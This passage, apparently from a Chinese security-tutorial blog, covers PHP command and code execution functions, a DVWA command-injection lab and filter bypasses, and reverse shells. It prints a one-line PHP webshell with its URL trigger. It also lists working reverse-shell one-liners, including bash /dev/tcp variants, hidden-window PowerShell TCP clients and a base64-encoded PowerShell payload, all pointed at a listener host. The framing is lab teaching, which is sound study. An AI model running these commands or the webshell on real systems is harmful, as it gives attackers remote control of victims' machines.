+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><h5 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h5><p>system — 执行外部程序，并且显示输出</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h5><p>exec — 执行一个外部程序</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$r</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h5><p>shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$r</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h5><p>popen — 打开进程文件指针</p>
+<p>打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// $r = popen("ping 127.0.0.1","r");</span>
+<span class="token keyword">echo</span> <span class="token variable">$r</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h5><p>passthru — 执行外部程序并且显示原始输出</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">passthru</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h5><p>pcntl_exec — 在当前进程空间执行指定程序</p>
+<p>Linux中常用，可以用于反弹shell</p>
+<h4 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h4><h5 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h5><p>把字符串作为PHP代码执行</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system('whoami');"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h5><p>PHP5：<strong>assert</strong>(mixed $assertion , string $description = ?): bool</p>
+<p>PHP7：<strong>assert</strong>(mixed $assertion , Throwable $exception = ?): bool</p>
+<p>assert — 检查一个断言是否为 false</p>
+<p>如果 assertion 是字符串，它将会被 <strong>assert()</strong> 当做 PHP 代码来执行。</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">assert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system('ipconfig');"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h5><p>preg_replace — 执行一个正则表达式的搜索和替换</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"(.*)"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"abc"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="creat-function"><a href="#creat-function" class="headerlink" title="creat_function()"></a>creat_function()</h5><p>create_function — 创建一个匿名函数</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$newfunc</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'$a'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'return system($a);'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$newfunc</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h5><p>array_map — 为数组的每个元素应用回调函数</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$arr</span><span class="token operator">=</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>
+<span class="token variable">$array</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ipconfig'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$new_array</span><span class="token operator">=</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h5><p>call_user_func — 把第一个参数作为回调函数调用</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ipconfig"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h5><p>call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ipconfig"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a>array_filter()</h5><p>array_filter — 使用回调函数过滤数组的元素</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">array_filter</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ipconfig"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="uasort"><a href="#uasort" class="headerlink" title="uasort()"></a>uasort()</h5><p>uasort — 使用用户自定义的比较函数，保持索引和值的对应关系，原地排序 array。</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"eval"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"system('whoami')"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token function">usort</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'assert'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>木马</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token function">usort</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'assert'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>url连接： ?a=eval($_GET[cmd])&amp;cmd=system(whoami);</p>
+<h3 id="漏洞复现-6"><a href="#漏洞复现-6" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>环境：DVWA靶场 <strong>Linux</strong></p>
+<p>关卡：Command Injection（low）</p>
+<p>正常功能：检测目标ip是否连通</p>
+<p><img src="/2023/01221/108.PNG" alt="108"></p>
+<p>构造多条执行的命令： 127.0.0.1 &amp; whoami</p>
+<p>代码审计之后可知实际执行的命令为：</p>
+<pre class="line-numbers language-pphp" data-language="pphp"><code class="language-pphp">ping 127.0.0.1 &amp; whoami<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>在windows操作系统中，使用&amp;符号可以执行多条命令</strong></p>
+<h4 id="过滤分割符"><a href="#过滤分割符" class="headerlink" title="过滤分割符"></a>过滤分割符</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">;</span> <span class="token comment">//两条命令都执行,windows不支持</span>
+<span class="token operator">|</span> <span class="token comment">// 管道</span>
+<span class="token operator">||</span> <span class="token comment">//上一条命令执行失败后，才执行下一条命令</span>
+<span class="token operator">&amp;</span> <span class="token comment">//先执行command2后执行command1</span>
+<span class="token operator">&amp;&amp;</span> <span class="token comment">//先执行command1后执行command2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="RCE绕过"><a href="#RCE绕过" class="headerlink" title="RCE绕过"></a>RCE绕过</h3><h4 id="前端验证绕过"><a href="#前端验证绕过" class="headerlink" title="前端验证绕过"></a>前端验证绕过</h4><p>环境：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">docker pull tanyiqu<span class="token operator">/</span>demo<span class="token operator">-</span>rce<span class="token punctuation">:</span>simple01
+
+docker run <span class="token operator">-</span>d <span class="token operator">-</span>p <span class="token number">8080</span><span class="token punctuation">:</span><span class="token number">80</span> tanyiqu<span class="token operator">/</span>demo<span class="token operator">-</span>rce<span class="token punctuation">:</span>simple01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>验证输入的内容是不是正确的ip格式</p>
+<p>禁用前端js即可绕过</p>
+<h4 id="空格绕过-1"><a href="#空格绕过-1" class="headerlink" title="空格绕过"></a>空格绕过</h4><p>环境：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">docker pull tanyiqu<span class="token operator">/</span>demo<span class="token operator">-</span>rce<span class="token punctuation">:</span>sapce01
+
+docker run <span class="token operator">-</span>d <span class="token operator">-</span>p <span class="token number">8080</span><span class="token punctuation">:</span><span class="token number">80</span> tanyiqu<span class="token operator">/</span>demo<span class="token operator">-</span>rce<span class="token punctuation">:</span>sapce01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>使用以下字符可以绕过空格</p>
+<ul>
+<li><p>tab（%09）</p>
+</li>
+<li><p>space(%20)</p>
+</li>
+<li><p>$IFS$9</p>
+</li>
+<li><p>${IFS}</p>
+</li>
+<li><p>$IFS</p>
+</li>
+</ul>
+<h3 id="反弹shell介绍"><a href="#反弹shell介绍" class="headerlink" title="反弹shell介绍"></a>反弹shell介绍</h3><h4 id="反弹"><a href="#反弹" class="headerlink" title="反弹"></a>反弹</h4><p>正向连接：客户端请求服务器，服务器给我们响应</p>
+<p>反向连接（反弹）：目标机器发送请求链接我们的服务器。</p>
+<h4 id="反弹shell基本操作"><a href="#反弹shell基本操作" class="headerlink" title="反弹shell基本操作"></a>反弹shell基本操作</h4><p>反弹shell命令生成网站：<a target="_blank" rel="noopener" href="https://www.revshells.com/">https://www.revshells.com/</a></p>
+<p>设置监听者的ip和端口</p>
+<p>开启监听：</p>
+<p>执行反弹命令:</p>
+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><h4 id="CVE-2018-8174"><a href="#CVE-2018-8174" class="headerlink" title="CVE-2018-8174"></a><strong>CVE-2018-8174</strong></h4><h2 id="RCE-反弹shell详解"><a href="#RCE-反弹shell详解" class="headerlink" title="RCE-反弹shell详解"></a>RCE-反弹shell详解</h2><h3 id="重难点"><a href="#重难点" class="headerlink" title="重难点"></a>重难点</h3><ul>
+<li><p>Linux Bash方式反弹</p>
+</li>
+<li><p>Windows Powershell反弹</p>
+</li>
+<li><p>Windows Metaspolit反弹</p>
+</li>
+</ul>
+<h3 id="Shell基础概念"><a href="#Shell基础概念" class="headerlink" title="Shell基础概念"></a>Shell基础概念</h3><h4 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h4><p>Shell中文意思为壳，Shell 是指一种应用程序，用户通过这个应用程序访问操作系统内核的服务。</p>
+<p>Linux内核（Kernel）具有管理计算机硬件的一些功能，如进程管理、内存管理等，内核识别计算机语言，因此需要一个程序帮助 “翻译” 人类语言为计算机语言。这个程序就是Shell。shell不特指某一个程序，能提供计算机交互的程序都叫做shell。</p>
+<h4 id="Shell脚本"><a href="#Shell脚本" class="headerlink" title="Shell脚本"></a>Shell脚本</h4><p>是一种为 shell 编写的脚本程序，本质上是脚本文件。</p>
+<h4 id="Shell编程"><a href="#Shell编程" class="headerlink" title="Shell编程"></a>Shell编程</h4><p>指开发shell脚本，并不是指开发shell程序</p>
+<h4 id="bash和sh"><a href="#bash和sh" class="headerlink" title="bash和sh"></a>bash和sh</h4><p>bash和sh是Linux中经常使用的shell</p>
+<p>Linux 的 Shell脚本解释器种类众多，常见的有：</p>
+<ul>
+<li><p>Bourne Shell（/usr/bin/sh或/bin/sh）</p>
+</li>
+<li><p>Bourne Again Shell（/bin/bash）</p>
+</li>
+<li><p>C Shell（/usr/bin/csh）</p>
+</li>
+<li><p>K Shell（/usr/bin/ksh）</p>
+</li>
+<li><p>Z shell（/usr/bin/zsh）</p>
+</li>
+<li><p>Shell for Root（/sbin/sh）</p>
+</li>
+</ul>
+<h3 id="反弹-反向连接"><a href="#反弹-反向连接" class="headerlink" title="反弹/反向连接"></a>反弹/反向连接</h3><p>反弹指的是，目标机器发送请求链接我们的服务器。</p>
+<p><img src="/2023/01221/109.PNG" alt="109"></p>
+<p>什么情况下需要反弹？</p>
+<ul>
+<li><p>一般防火墙会拦截对内部的请求，但是对向外部的访问不做限制。</p>
+</li>
+<li><p>目标主机在内网，我们不能直接链接，但是目标可以出网</p>
+</li>
+</ul>
+<h4 id="netcat瑞士军刀"><a href="#netcat瑞士军刀" class="headerlink" title="netcat瑞士军刀"></a>netcat瑞士军刀</h4><p>NetCat，在网络工具中有“瑞士军刀”美誉，其有Windows和Linux的版本。因为它短小精悍（1.84版本也不过25k，旧版本或缩减版甚至更小）、功能实用。</p>
+<h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><ul>
+<li><p>Kali：自带</p>
+</li>
+<li><p>CentOS：yum install nc</p>
+</li>
+<li><p>Windows：<a target="_blank" rel="noopener" href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></p>
+</li>
+</ul>
+<p>注：Windows中运行nc会被杀毒软件拦截，需要添加信任</p>
+<h5 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># nc -lvvp&#x2F;lvnp port
+nc -lvvp 9999 # vv为显示更详细的信息
+nc -lvnp 9999 # n为使用数值ip，不适用DNS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="linux反弹shell"><a href="#linux反弹shell" class="headerlink" title="linux反弹shell"></a>linux反弹shell</h3><h4 id="sh-bash"><a href="#sh-bash" class="headerlink" title="sh/bash"></a>sh/bash</h4><h5 id="Bash-i"><a href="#Bash-i" class="headerlink" title="Bash -i"></a>Bash -i</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sh -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.61.1&#x2F;9999 0&gt;&amp;1
+
+bash -c &quot;sh -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.61.1&#x2F;9999 0&gt;&amp;1&quot;&#x2F;&#x2F;备用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/01221/110.PNG" alt="110"></p>
+<h5 id="Bash-read-line"><a href="#Bash-read-line" class="headerlink" title="Bash read line"></a>Bash read line</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.61.1&#x2F;9999;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/01221/113.PNG" alt="113"></p>
+<h5 id="Bash5"><a href="#Bash5" class="headerlink" title="Bash5"></a>Bash5</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bash -c &quot;sh -i 5&lt;&gt; &#x2F;dev&#x2F;tcp&#x2F;192.168.61.1&#x2F;9999 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/01221/111.PNG" alt="111"></p>
+<h5 id="Bash196"><a href="#Bash196" class="headerlink" title="Bash196"></a>Bash196</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.61.1&#x2F;9999; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/01221/112.PNG" alt="112"></p>
+<h3 id="windows反弹shell"><a href="#windows反弹shell" class="headerlink" title="windows反弹shell"></a>windows反弹shell</h3><h4 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&#x2F;&#x2F;本机环境一塌糊涂
+shift+鼠标右键&#x2F;&#x2F;可以打开powershell窗口，可运行脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h5 id="Powershell1"><a href="#Powershell1" class="headerlink" title="Powershell1"></a>Powershell1</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">powershell -nop -c &quot;$client &#x3D; New-Object System.Net.Sockets.TCPClient(&#39;192.168.111.136&#39;,9999);$stream &#x3D; $client.GetStream();[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;;while(($i &#x3D; 
+$stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String );$sendback2 &#x3D; $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte &#x3D; 
+([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="Powershell2"><a href="#Powershell2" class="headerlink" title="Powershell2"></a>Powershell2</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">powershell -nop -W hidden -noni -ep bypass -c &quot;$TCPClient &#x3D; New-Object 
+Net.Sockets.TCPClient(&#39;192.168.61.1&#39;, 9999);$NetworkStream &#x3D; 
+$TCPClient.GetStream();$StreamWriter &#x3D; New-Object 
+IO.StreamWriter($NetworkStream);function WriteToStream ($String) 
+&#123;[byte[]]$script:Buffer &#x3D; 0..$TCPClient.ReceiveBufferSize | % 
+&#123;0&#125;;$StreamWriter.Write($String + &#39;SHELL&gt; &#39;);$StreamWriter.Flush()&#125;WriteToStream 
+&#39;&#39;;while(($BytesRead &#x3D; $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) 
+&#123;$Command &#x3D; ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 
+1);$Output &#x3D; try &#123;Invoke-Expression $Command 2&gt;&amp;1 | Out-String&#125; catch &#123;$_ | OutString&#125;WriteToStream ($Output)&#125;$StreamWriter.Close()&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="Powershell-Base64"><a href="#Powershell-Base64" class="headerlink" title="Powershell Base64"></a>Powershell Base64</h5><p><strong>shell自动生成地址：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.revshells.com/">https://www.revshells.com/</a></p>
+<p>将Powershell1中，-c后面的内容，即双引号中的内容使用base64编码</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQAxAC4AMQAzADYAIgAsADkAOQA5ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/01221/114.PNG" alt="114"></p>
+<p><img src="/2023/01221/115.PNG" alt="115"></p>
+<h4 id="Metaspolit"><a href="#Metaspolit" class="headerlink" title="Metaspolit"></a>Metaspolit</h4><p>Metasploit框架(Metasploit Framework，MSF)是一个开源工具，旨在方便渗透测试，他是有Ruby程序语言编写的模板化框架，具有很好的扩展性，便于渗透测试人员开发、使用定制的工具模板。几乎所有流行的操作系统都支持Metasploit框架而且Metasploit框架在这些操作系统上的工作流程基本都一样。</p>
+<p><strong>反弹三部曲：</strong></p>
+<ol>
+<li>生成木马</li>
